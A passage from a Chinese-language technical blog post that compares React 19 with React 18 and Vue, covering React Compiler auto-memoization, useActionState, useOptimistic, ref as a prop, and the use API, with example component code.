  <span class="hljs-comment">// 没有任何 Hook，就是纯 JS 逻辑</span>
  <span class="hljs-comment">// React Compiler 会在编译时自动分析：</span>
  <span class="hljs-comment">// "只要 products 和 filterTerm 没变，我就直接给上次的结果"</span>
  <span class="hljs-keyword">const</span> filteredProducts = products.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(filterTerm));

  <span class="hljs-comment">// 这里的函数也不需要 useCallback</span>
  <span class="hljs-comment">// 编译器会自动帮你做“函数持久化”，确保子组件不会因为引用变化而重绘</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePurchase</span> = (<span class="hljs-params">id</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"购买商品:"</span>, id);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
      {filteredProducts.map(p =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{p.id}</span> <span class="hljs-attr">product</span>=<span class="hljs-string">{p}</span> <span class="hljs-attr">onPurchase</span>=<span class="hljs-string">{handlePurchase}</span> /&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-3">React Compiler的意义</h3>
<p>React Compiler的意义远远不止省略了useMemo、useCallback、React.memo. 这是react19更新的核心理念的体现 <strong>“通过编译器的力量，抹平框架与原生语言之间的缝隙。”</strong></p>
<p>React 19 的伟大之处不在于它增加了多少新 API，而在于它让‘React 开发者’重新变回了‘JavaScript 开发者’。它承认了人类的大脑不该用来记忆依赖数组，而该用来构建业务逻辑。</p>
<h3 data-id="heading-4">对比Vue</h3>
<p>谈到React，Vue总是不可避免的一个话题，Vue在缓存方面是怎么做的呢？</p>
<p><strong>Vue 写法</strong></p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">count</span> = ref(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>

// 你必须明确调用 computed 函数
// 虽然不用写依赖数组，但必须通过 .value 读值
const <span class="hljs-attr">doubled</span> = computed(() =&gt; count.value * <span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
</code></pre>
<p><strong>React 18 写法</strong></p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-section">[count, setCount]</span> = useState(0)<span class="hljs-comment">;</span>

// 1. 必须手动写 useMemo
// 2. 必须手动维护依赖数组 <span class="hljs-section">[count]</span>
const <span class="hljs-attr">doubled</span> = useMemo(() =&gt; {
  return count * 2<span class="hljs-comment">;</span>
}, <span class="hljs-section">[count]</span>)<span class="hljs-comment">;</span>
</code></pre>
<p><strong>React 19 写法</strong></p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-section">[count, setCount]</span> = useState(0)<span class="hljs-comment">;</span>

// 没有任何框架 API，没有任何包裹函数
// 就像写普通的 JavaScript 一样
const <span class="hljs-attr">doubled</span> = count * <span class="hljs-number">2</span><span class="hljs-comment">;</span>
</code></pre>
<p>我们可以看到，在React18之前，Vue的自动依赖追踪是很有优势的，但是在React19，react实现了从落后到反超，那么Vue什么时候会抛弃掉计算属性，也实现自动化优化呢？</p>
<p><strong>React 19 通过“降维打击”，把 Vue 曾经最引以为傲的“自动依赖追踪”变得更透明。</strong></p>
<h2 data-id="heading-5">二、React19 的Actions机制——异步状态的“原生化”</h2>
<h3 data-id="heading-6">useActionState</h3>
<h4 data-id="heading-7">react18的Actions</h4>
<p>在react18假设我们要写一个简单的评论框，逻辑是：点击提交 -&gt; 显示加载中 -&gt; 成功后清空输入框 -&gt; 失败显示错误。那么经典的写法是下面这种</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">CommentForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 痛点 1：必须手动定义一大堆状态</span>
  <span class="hljs-keyword">const</span> [comment, setComment] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">""</span>);
  <span class="hljs-keyword">const</span> [isPending, setIsPending] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">e</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>();
    
    <span class="hljs-comment">// 痛点 2：手动开启 Loading</span>
    <span class="hljs-title function_">setIsPending</span>(<span class="hljs-literal">true</span>);
    <span class="hljs-title function_">setError</span>(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">saveComment</span>(comment); <span class="hljs-comment">// 异步请求</span>
      <span class="hljs-title function_">setComment</span>(<span class="hljs-string">""</span>); <span class="hljs-comment">// 成功后手动重置</span>
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-comment">// 痛点 3：手动捕获并处理错误</span>
      <span class="hljs-title function_">setError</span>(e.<span class="hljs-property">message</span>);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-comment">// 痛点 4：手动关闭 Loading</span>
      <span class="hljs-title function_">setIsPending</span>(<span class="hljs-literal">false</span>);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSubmit}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> 
        <span class="hljs-attr">value</span>=<span class="hljs-string">{comment}</span> 
        <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setComment(e.target.value)} 
      /&gt;
      {/* 痛点 5：Loading 状态分散在各处，容易漏掉禁用逻辑 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">{isPending}</span>&gt;</span>
        {isPending ? "提交中..." : "发布评论"}
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      {error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{error}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<p>可能有小伙伴不理解<strong>为什么一定要定义状态isPending和error</strong>，我们直接使用不行么？</p>
<p>我们要知道的是<strong>react的核心思想是UI=f(date)</strong>，数据（状态）是驱动UI渲染的最终因素，底层的DOM批量更新也是通过判断状态是否变化来确定的。如果不设置isPending和error就可能出现下面的情况——</p>
<p>你发起一个异步请求，即使后台正在疯狂下载数据，React 的渲染引擎根本不知道这件事。</p>
<p>用户点击了“提交”，页面却没有任何反应（按钮没变灰、没有转圈圈）。用户以为没点着，就会不停地狂点，导致后台收到一堆重复请求。</p>
<p>所以存储 isPending 是为了告诉 React：我现在状态变了，请你赶紧重绘一下 UI。</p>
<h5 data-id="heading-8">react18中我们设置的状态到底在做什么</h5>
<p>在 React 18 的这种模式下，开发者实际上在充当 <strong>“状态协调员”</strong>：</p>
<p>竞态条件：如果用户连点两次按钮，你需要写额外的逻辑防止第二次请求覆盖第一次。</p>
<p>UI 不同步：如果你忘了在 finally 里关闭 isPending，按钮就永远锁死了。</p>
<p>样板代码冗余：每一个表单、每一个按钮点击，你都要重复写这套 try-catch-finally。</p>
<p>在 React 18 中，异步操作像是一头需要你时刻盯着的猛兽，你必须手动给它关笼子（setLoading）、喂食（handleError）。而在 React 19 中，React 给异步操作装上了‘自动驾驶系统’。你只需要告诉它目的地（Action 函数），它会自动处理起步、巡航和刹车。</p>
<h4 data-id="heading-9">react19的优化</h4>
<p>在react19中的写法是这样的</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">CommentForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// state 包含返回结果，formAction 是触发函数，isPending 是自动追踪的状态</span>
  <span class="hljs-keyword">const</span> [state, formAction, isPending] = <span class="hljs-title function_">useActionState</span>(
    <span class="hljs-keyword">async</span> (prevState, formData) =&gt; {
      <span class="hljs-keyword">const</span> content = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">"comment"</span>);
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">saveComment</span>(content); 
      <span class="hljs-keyword">return</span> result; <span class="hljs-comment">// 返回的结果会自动存入 state</span>
    },
    <span class="hljs-literal">null</span>
  );

  <span class="hljs-keyword">return</span> (
    <span class="hljs-comment">// 注意：这里不再用 onSubmit，而是用 action</span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{formAction}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"comment"</span> /&gt;</span>
      
      {/* isPending 由 React 自动管理，Promise 没结束它就是 true */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">{isPending}</span>&gt;</span>
        {isPending ? "提交中..." : "发布评论"}
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      
      {state?.error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{state.error}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<p>我们可以观察到</p>
<ul>
<li>
<p>消失了： <code>const [loading, setLoading] = useState(false)。</code></p>
</li>
<li>
<p>消失了： <code>try { ... } finally { setLoading(false) }。</code></p>
</li>
<li>
<p>消失了： <code>输入框的 value 和 onChange（利用 formData 直接读取）。</code></p>
</li>
<li>
<p>消失了： <code>对“请求是否结束”的手动判断。</code></p>
</li>
</ul>
<p>为什么以前我们总是在写重复的 useState(false)？因为 React 18 只负责渲染，不负责跟踪你的异步任务。而 React 19 的 Actions 机制，让框架开始‘理解’异步任务的生命周期，从而把开发者从重复的状态定义中解放出来。</p>
<h3 data-id="heading-10">useOptimistic</h3>
<p>useOptimistic主要解决乐观更新的问题。</p>
<p><strong>react18的乐观更新</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LikeButton</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [likes, setLikes] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">// 真实数据</span>
  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLike</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 1. 备份旧数据（为了失败时回滚）</span>
    <span class="hljs-keyword">const</span> previousLikes = likes;

    <span class="hljs-comment">// 2. 立即更新 UI（乐观更新）</span>
    <span class="hljs-title function_">setLikes</span>(likes + <span class="hljs-number">1</span>);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">updateLikeApi</span>(); <span class="hljs-comment">// 发送请求</span>
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-comment">// 3. 失败处理：手动把数据改回去</span>
      <span class="hljs-title function_">setLikes</span>(previousLikes); 
      <span class="hljs-title function_">setError</span>(<span class="hljs-string">"更新失败，已回滚"</span>);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLike}</span>&gt;</span>
      {likes} 👍 {error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{error}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>react19的乐观更新</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useOptimistic } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">LikeButton</span>(<span class="hljs-params">{ initialLikes }</span>) {
  <span class="hljs-comment">// 1. 它是基于原始数据的“派生状态”</span>
  <span class="hljs-keyword">const</span> [optimisticLikes, addOptimisticLike] = <span class="hljs-title function_">useOptimistic</span>(
    initialLikes,
    <span class="hljs-function">(<span class="hljs-params">state, newLike</span>) =&gt;</span> state + <span class="hljs-number">1</span> <span class="hljs-comment">// 定义如何“乐观地”改变</span>
  );

  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleLike</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 2. 瞬间改变 UI</span>
    <span class="hljs-title function_">addOptimisticLike</span>(<span class="hljs-number">1</span>);

    <span class="hljs-comment">// 3. 发送真实请求（配合 Actions）</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">updateLikeApi</span>();
    
    <span class="hljs-comment">// 【关键点】：函数执行完，React 自动把 UI 同步为服务器回来的真实 initialLikes</span>
    <span class="hljs-comment">// 开发者不需要写任何“回滚”代码！</span>
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLike}</span>&gt;</span>{optimisticLikes} 👍<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<p>useOptimistic 引入了一种 <strong>‘阅后即焚’的状态管理模式。它不再需要开发者去写复杂的同步逻辑，而是通过监听异步函数的‘生命周期’，自动完成了从‘幻想’到‘现实’的平滑切换。这种绑定不是通过代码硬连的，而是通过时间维度（异步执行的过程）</strong> 自动关联的。</p>
<h2 data-id="heading-11">三、ref 不再需要“中间商”：再见 forwardRef</h2>
<p>在 React 18 时代，如果你想把 ref 传递给子组件，你必须使用 forwardRef 包裹子组件。这是 React 中最令人反感的“模板代码”之一，写法极其拗口。</p>
<p><strong>React 18 的痛苦写法</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyInput</span> = <span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> {<span class="hljs-attr">...props</span>} <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> /&gt;</span></span>;
});
</code></pre>
<p>React 19 的简洁写法： ref 现在可以像 id、className 一样作为普通的 prop 传递。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyInput</span>(<span class="hljs-params">{ placeholder, ref }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">{placeholder}</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> /&gt;</span></span>;
}
</code></pre>
<p>这一改动抹平了 ref 与普通属性之间的差异，组件的结构变得更加扁平、直观。</p>
<h3 data-id="heading-12">为什么之前的设计要求使用forwardRef？</h3>
<h4 data-id="heading-13">1. 语义冲突：谁才是 ref 的主人？</h4>
<p><strong>在 React 的早期设计中，ref 的语义非常霸道：它永远指向“当前标签”所对应的直接实例。</strong></p>
<ul>
<li>
<p>对于<strong>原生标签</strong>（如 <code>&lt;input /&gt;</code>）：ref 指向真实的 DOM 节点。</p>
</li>
<li>
<p>对于<strong>组件标签</strong>（如 <code>&lt;MyComponent /&gt;</code>）：ref 指向该组件的实例（Instance）。</p>
</li>
</ul>
<p><strong>如果没有 forwardRef，会发生什么？ 假设你写了 <code>&lt;MyInput ref={myRef} /&gt;</code>：</strong></p>
<ol>
<li>
<p>React 引擎会认为：你想拿到 MyInput 这个组件包装盒的引用。</p>
</li>
<li>
<p>如果 ref 混在 props 里，子组件内部又把这个 ref 传给了底层的 <input type="checkbox" disabled="disabled"/>。</p>
</li>
<li>
<p>此时系统就乱了：同一个 ref 到底该指向外层的组件实例，还是里层的 DOM 节点？</p>
</li>
</ol>
<p><strong>为了避免这种指向不明的混乱</strong>，React 强制规定：ref 不属于 props，它必须由框架层统一调度。</p>
<h4 data-id="heading-14">2. 类组件时代的“实例保护”</h4>
<p>在 Hooks 出现之前，React 主要是类组件。</p>
<p>类组件有内部状态、有方法（比如 this.myMethod()）。通过 ref 拿到组件实例是非常强大的功能。</p>
<p>如果 React 允许 ref 随 props 传递，子组件可能会不小心修改或覆盖掉父组件传下来的 ref。</p>
<p><strong>forwardRef很大程度上是一份“免责声明”React 官方当时觉得：“转发 Ref 是一件很危险的操作，不能让你随随便便就做了。”于是它强制要求你写 forwardRef。这个复杂的语法实际上是在逼你确认：“我，开发者，现在明确知道我要把父组件的控制权（Ref）交给子组件处理了。如果子组件乱搞，或者指向出错了，我认了。”</strong></p>
<p>将 ref 抽离出来，通过特殊的 forwardRef 接口，实际上是在强迫开发者意识到：“注意，你现在正在把原本属于组件外部的控制权，穿透到组件内部。” 这是一种显式的声明，防止开发者无意中破坏了封装性。</p>
<h4 data-id="heading-15">3. 性能与一致性</h4>
<p>React 的底层有一个非常高效的 props 比较机制。</p>
<p>props 通常是不可变的纯数据。</p>
<p>ref 是一个可变对象，其 current 属性会随生命周期不断变化。</p>
<p>如果把这个“多动”的 ref 塞进 props，会导致 React 在判断组件是否需要重渲染时，不得不对 ref 做特殊逻辑判断，增加了底层的复杂度。</p>
<h4 data-id="heading-16">4.为什么 React 19 现在又敢合回去了？</h4>
<p>React 19 之所以能取消 forwardRef，是因为两个环境变了：</p>
<p>函数组件成为绝对主流：函数组件没有“实例”。这意味着当你写 <code>&lt;MyComponent ref={myRef} /&gt;</code> 时，除非你手动转发，否则<strong>这个 ref 根本没东西可绑。既然没东西绑，那就不存在“语义冲突”了</strong>。</p>
<p>编译器变聪明了：<strong>React Compiler 现在可以精准地追踪 ref 的去向。既然工具能搞定，就没必要让程序员手写那一层蹩脚的包裹函数了。</strong></p>
<p>forwardRef 的消失，<strong>本质上是 React 从‘保护组件实例’转向‘拥抱函数式纯净’的最后一步</strong>。</p>
<p>过去，React 像一个严厉的家长，担心我们将 ref 乱传导致指向混乱，所以设置了 forwardRef 这个门槛。</p>
<p>如今，在函数组件和编译器的双重护航下，React 终于相信开发者可以处理好 ref 与 props 的关系。这个‘门槛’的拆除，让 React 的代码看起来更像是一段自然的、毫无框架痕迹的 JavaScript 代码。</p>
<h2 data-id="heading-17">四、use Hook</h2>
<p>React 19 引入的 use 实际上是 Hooks 的 <strong>“增强版”</strong> 。它最大的突破就是：它可以在条件语句和循环中运行。</p>
<p>注：use并不是一个hook，只是一个API</p>
<h3 data-id="heading-18">1.react18的context问题</h3>
<p>在react 18中有一个比较大的弊端，那就是hook只能在组件的顶层去定义，而且不可以放在条件判断或者循环中去使用。</p>
<p>假设你有一个权限系统，只有管理员（Admin）才需要读取一个巨大的 PermissionsContext。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dashboard</span>(<span class="hljs-params">{ isAdmin }</span>) {
  <span class="hljs-comment">// 即使 isAdmin 为 false，你也必须在顶层调用它</span>
  <span class="hljs-comment">// 这意味着每个普通用户都在订阅这个庞大的上下文</span>
  <span class="hljs-keyword">const</span> permissions = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">PermissionsContext</span>); 

  <span class="hljs-keyword">if</span> (!isAdmin) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>普通用户界面<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminPanel</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{permissions}</span> /&gt;</span></span>;
}
</code></pre>
<p>性能开销：在 React 中，只要你 useContext，那么当 Context 的值变化时，该组件一定会重新渲染。这意味着成千上万的普通用户，会因为一个他们根本用不到的“管理员权限数据”更新而被迫重新渲染组件。</p>
<p>use 打破了“顶层限制”。你可以把订阅逻辑藏在逻辑判断里：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dashboard</span>(<span class="hljs-params">{ isAdmin }</span>) {
  <span class="hljs-keyword">if</span> (isAdmin) {
    <span class="hljs-comment">// 只有当程序运行到这里时，React 才会建立组件与 Context 的订阅关系</span>
    <span class="hljs-keyword">const</span> permissions = <span class="hljs-title function_">use</span>(<span class="hljs-title class_">PermissionsContext</span>); 
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminPanel</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{permissions}</span> /&gt;</span></span>;
  }
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>普通用户界面<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;
}
</code></pre>
<p>优化结果：对于非管理员，React 根本不会把这个组件挂载到 PermissionsContext 的监听队列里。这实现了真正的“逻辑按需加载”。</p>
<h3 data-id="heading-19">2.直接处理异步 —— 渲染逻辑的“同步化”</h3>
<p><strong>React 团队希望开发者读取数据（无论是 Context 还是 Promise）时，能像读取普通变量一样自然，而不是非要包一层 useEffect。</strong></p>
<p>这是 React 19 最具革命性的变化。它让“异步取数据”这件事，在代码观感上变成了“同步取变量”。</p>
<h4 data-id="heading-20">1. 传统模式：状态的“中间商”</h4>
<p>在以前，数据流是断裂的：</p>
<ol>
<li>
<p>渲染组件（显示 Loading）。</p>
</li>
<li>
<p>useEffect 启动（异步拿数据）。</p>
</li>
<li>
<p>数据回来，setData（触发二次渲染）。</p>
</li>
<li>
<p>再次渲染组件（显示数据）。 开发者必须手动维护这个“中间状态”。</p>
</li>
</ol>
<h4 data-id="heading-21">2. React 19 use(Promise) 模式：数据直达</h4>
<p>use 让 React 组件具备了“等待”的能力。它不再需要中间状态变量，而是直接深度集成到 React 的 Suspense（悬停机制） 中。</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Message</span>(<span class="hljs-params">{ messagePromise }</span>) {
  <span class="hljs-comment">// 1. 如果 Promise 还在 pending，React 暂停当前组件执行，直接跳出</span>
  <span class="hljs-comment">// 2. 此时，外层的 &lt;Suspense&gt; 捕获并显示 fallback（比如加载动画）</span>
  <span class="hljs-comment">// 3. 当 Promise 完成（Resolved），React 自动回到这里，把结果给到 content</span>
  <span class="hljs-keyword">const</span> content = <span class="hljs-title function_">use</span>(messagePromise); 
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{content}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;
}
</code></pre>
<p>我们可以举一个例子来看</p>
<h5 data-id="heading-22">(1) React 18 的做法：繁琐的“副作用手动挡”</h5>
<p>在 React 19 之前，异步获取数据是一场关于 useEffect、useState 和“时机管理”的博弈。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// React 18 典型写法</span>
function <span class="hljs-built_in">UserProfile</span>({ userId }) {
  const <span class="hljs-selector-attr">[user, setUser]</span> = <span class="hljs-built_in">useState</span>(null);
  const <span class="hljs-selector-attr">[loading, setLoading]</span> = <span class="hljs-built_in">useState</span>(true);
  const <span class="hljs-selector-attr">[error, setError]</span> = <span class="hljs-built_in">useState</span>(null);

  <span class="hljs-built_in">useEffect</span>(() =&gt; {
    <span class="hljs-comment">// 每次 userId 变了，都要手动重置状态</span>
    <span class="hljs-built_in">setLoading</span>(true);
    <span class="hljs-built_in">setError</span>(null);

    <span class="hljs-built_in">fetchUser</span>(userId)
      <span class="hljs-selector-class">.then</span>((data) =&gt; {
        <span class="hljs-built_in">setUser</span>(data); <span class="hljs-comment">// 手动存入状态</span>
      })
      <span class="hljs-selector-class">.catch</span>((err) =&gt; {
        <span class="hljs-built_in">setError</span>(err); <span class="hljs-comment">// 手动处理错误</span>
      })
      <span class="hljs-selector-class">.finally</span>(() =&gt; {
        <span class="hljs-built_in">setLoading</span>(false); <span class="hljs-comment">// 手动关闭加载</span>
      });
  }, <span class="hljs-selector-attr">[userId]</span>); <span class="hljs-comment">// 必须死盯着依赖数组</span>

  if (loading) return &lt;<span class="hljs-selector-tag">div</span>&gt;加载中...&lt;/<span class="hljs-selector-tag">div</span>&gt;;
  if (error) return &lt;<span class="hljs-selector-tag">div</span>&gt;出错了：{error<span class="hljs-selector-class">.message</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;;
  if (!user) return null;

  return &lt;<span class="hljs-selector-tag">h1</span>&gt;{user<span class="hljs-selector-class">.name</span>}&lt;/<span class="hljs-selector-tag">h1</span>&gt;;
}
</code></pre>
<p>痛点总结：</p>
<ol>
<li>
<p>状态冗余：为了显示一个数据，你额外创建了 3 个状态（user, loading, error）。</p>
</li>
<li>
<p>流程支离破碎：数据获取逻辑被迫写在 useEffect 里，与 UI 渲染逻辑完全分离。</p>
</li>
<li>
<p>“瀑布流”困境：这种写法通常会导致组件先渲染出一个空的“壳子”，然后再去加载数据，体验不够流畅。</p>
</li>
</ol>
<h5 data-id="heading-23">(2) React 19 的做法：直觉的“渲染即同步”</h5>
<p>在 React 19 中，你可以直接在渲染过程中“读取”异步结果。代码看起来就像是同步执行的一样。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// React 19 写法</span>
<span class="hljs-keyword">import</span> { use } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">{ userPromise }</span>) {
  <span class="hljs-comment">// 直接“解开”这个 Promise，就像读取一个普通变量</span>
  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">use</span>(userPromise); 

  <span class="hljs-comment">// 代码执行到这里时，user 已经是请求成功后的真实数据了</span>
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;
}

<span class="hljs-comment">// 在父组件中使用</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> userPromise = <span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// 启动异步请求</span>

  <span class="hljs-keyword">return</span> (
    <span class="hljs-comment">// 错误处理交给外层的 ErrorBoundary</span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>出错了<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
      {/* 加载状态交给外层的 Suspense */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> <span class="hljs-attr">userPromise</span>=<span class="hljs-string">{userPromise}</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-24">3. 为什么这个极其重要？</h4>
<p><strong>消除竞态条件：</strong> 以前你在 useEffect 里发请求，如果请求还没回来 id 就变了，你需要写逻辑去忽略旧请求。而 use 是在渲染流程里的，如果 id 变了，React 会直接处理新的 Promise，旧的会自动被废弃。</p>
<p><strong>组件更纯粹：</strong> 组件变成了一个真正的“视图生成器”。它不再是一个管理 Fetch 逻辑的状态机，而是一个 <strong>“给它 Promise，它就吐出 UI”</strong> 的纯函数。</p>
<h2 data-id="heading-25">结语</h2>
<p>回顾 React 19 的这些重磅更新，你会发现它们并不是在盲目追求新功能，而是<strong>共同在做一个减法——消除“框架带来的心智负担”。</strong></p>
<p>在过去很长一段时间里，React 开发者其实背负着沉重的“框架税”：为了性能，我们得手动管理 useMemo 的依赖数组；为了处理异步，我们得在 useEffect 里编写重复的加载与错误逻辑；为了穿透 ref，我们得忍受 forwardRef 那样拗口的语法。这些逻辑虽然必要，但它们与业务本身无关，更像是为了“迁就” React 的局限性而写的方言。</p>
